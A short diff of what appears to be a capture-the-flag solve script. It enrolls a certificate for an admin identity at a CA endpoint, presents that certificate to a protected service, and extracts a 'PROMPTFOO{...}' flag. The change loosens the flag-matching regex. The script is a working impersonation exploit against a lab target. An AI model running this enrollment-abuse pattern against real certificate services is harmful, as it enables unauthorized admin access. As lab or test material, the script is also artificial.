@@ -10,6 +10,6 @@ cert="$(curl -s "$BASE/ca/enroll?cn=admin@corp.internal" | python3 -c 'import sy
 echo "    cert=$cert"
 
 echo "[*] stage 2 — present the cert to the protected service ->"
-flag="$(curl -s -G "$BASE/service/data" --data-urlencode "cert=$cert" | grep -o 'PROMPTFOO{s10_pki[^}]*}' | head -n1)"
+flag="$(curl -s -G "$BASE/service/data" --data-urlencode "cert=$cert" | grep -o 'PROMPTFOO{[^}]*}' | head -n1)"
 [ -n "$flag" ] || { echo "[!] flag not recovered" >&2; exit 1; }
 echo "$flag"
